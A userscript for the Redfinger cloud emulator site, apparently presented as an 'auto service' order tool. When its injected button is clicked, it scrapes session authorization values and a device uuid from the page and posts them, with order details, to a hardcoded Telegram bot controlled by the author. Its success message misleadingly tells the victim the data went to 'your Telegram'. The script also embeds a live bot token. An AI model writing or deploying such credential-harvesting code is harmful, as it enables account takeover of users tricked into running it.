// ==UserScript==
// @name         Redfinger Auto Capture + Send
// @namespace    https://dazai-ux.github.io
// @version      1.4
// @description  Capture and send credentials directly to Telegram
// @author       Redfinger Auto
// @match        https://www.cloudemulator.net/*
// @grant        GM_setClipboard
// @grant        GM_xmlhttpRequest
// @run-at       document-end
// ==/UserScript==

(function () {
    'use strict';

    const BOT_TOKEN = "8758270440:AAEdUvBIKpGqhu0CzsLcOV3oQnwRP7c25jI";
    const CHAT_ID = "6598357465";

    function createButton() {
        if (document.getElementById('rf-capture-btn')) return;

        const btn = document.createElement('button');
        btn.id = 'rf-capture-btn';
        btn.innerHTML = '🚀 SEND CREDENTIALS TO AUTO SERVICE';
        btn.style.cssText = `
            position: fixed; bottom: 25px; right: 25px; z-index: 9999999;
            padding: 16px 24px; background: linear-gradient(90deg, #3b82f6, #60a5fa);
            color: white; border: none; border-radius: 50px; font-size: 16px; font-weight: bold;
            box-shadow: 0 8px 25px rgba(59,130,246,0.5); cursor: pointer;
        `;

        btn.onclick = sendCredentials;
        document.body.appendChild(btn);
    }

    function sendCredentials() {
        let userId = "Not Found";
        let sessionId = "Not Found";
        let uuid = "Not Found";

        // Capture Authorization
        const elements = document.querySelectorAll('*');
        for (let el of elements) {
            const auth = el.getAttribute('authorization') || el.getAttribute('Authorization');
            if (auth) {
                const parts = auth.trim().split(/\s+/);
                if (parts.length >= 2) {
                    userId = parts[0];
                    sessionId = parts[1];
                    break;
                }
            }
        }

        uuid = localStorage.getItem('uuid') || localStorage.getItem('deviceId') || "Manual";

        const customer = prompt("Your Name:", "dazai") || "Customer";
        const days = prompt("How many days?", "2000") || "2000";
        const vip = prompt("VIP Level?", "SVIP") || "SVIP";

        const message = `🔑 *New Redfinger Order!*\n\n` +
                       `👤 Customer: ${customer}\n` +
                       `📅 Days: ${days}\n` +
                       `⭐ VIP: ${vip}\n\n` +
                       `User ID: ${userId}\n` +
                       `Session ID: ${sessionId}\n` +
                       `UUID: ${uuid}`;

        // Send to Telegram
        GM_xmlhttpRequest({
            method: "POST",
            url: `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
            headers: { "Content-Type": "application/json" },
            data: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: "Markdown"
            }),
            onload: function(response) {
                if (response.status === 200) {
                    alert("✅ Credentials sent successfully to your Telegram!");
                } else {
                    alert("Sent to clipboard as backup.");
                    GM_setClipboard(message);
                }
            },
            onerror: function() {
                alert("Failed to send. Copied to clipboard instead.");
                GM_setClipboard(message);
            }
        });
    }

    setTimeout(createButton, 3000);
})();
